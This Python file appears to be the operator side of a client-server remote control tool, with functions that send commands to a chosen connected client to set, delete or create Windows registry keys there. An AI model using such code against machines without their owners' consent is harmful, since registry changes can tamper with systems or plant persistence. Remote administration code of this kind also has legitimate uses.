def handle_key_commands(server, command):
    if command == 'setvalue':
        return set_value(server)
    elif command == 'delkey':
        return del_key(server)
    elif command == 'createkey':
        return create_key(server)
    return "Command not recognized"

def set_value(server):
    server.clients[server.current_client_ip].send(b'setvalue')
    const = input("Enter the HKEY_* constant [HKEY_CLASSES_ROOT, HKEY_CURRENT_USER, HKEY_LOCAL_MACHINE, HKEY_USERS, HKEY_CURRENT_CONFIG]: ")
    root = input('Enter the path to store key [ex. SOFTWARE\\test]: ')
    key = input('Enter the key name: ')
    value = input('Enter the value of key [None, 0, 1, 2 etc.]: ')
    server.clients[server.current_client_ip].send(const.encode())
    server.clients[server.current_client_ip].send(root.encode())
    server.clients[server.current_client_ip].send(key.encode())
    server.clients[server.current_client_ip].send(value.encode())
    result_output = server.clients[server.current_client_ip].recv(1024).decode()
    return result_output

def del_key(server):
    server.clients[server.current_client_ip].send(b'delkey')
    const = input("Enter the HKEY_* constant [HKEY_CLASSES_ROOT, HKEY_CURRENT_USER, HKEY_LOCAL_MACHINE, HKEY_USERS, HKEY_CURRENT_CONFIG]: ")
    root = input('Enter the path to key: ')
    server.clients[server.current_client_ip].send(const.encode())
    server.clients[server.current_client_ip].send(root.encode())
    result_output = server.clients[server.current_client_ip].recv(1024).decode()
    return result_output

def create_key(server):
    server.clients[server.current_client_ip].send(b'createkey')
    const = input("Enter the HKEY_* constant [HKEY_CLASSES_ROOT, HKEY_CURRENT_USER, HKEY_LOCAL_MACHINE, HKEY_USERS, HKEY_CURRENT_CONFIG]: ")
    root = input('Enter the path to key: ')
    server.clients[server.current_client_ip].send(const.encode())
    server.clients[server.current_client_ip].send(root.encode())
    result_output = server.clients[server.current_client_ip].recv(1024).decode()
    return result_output
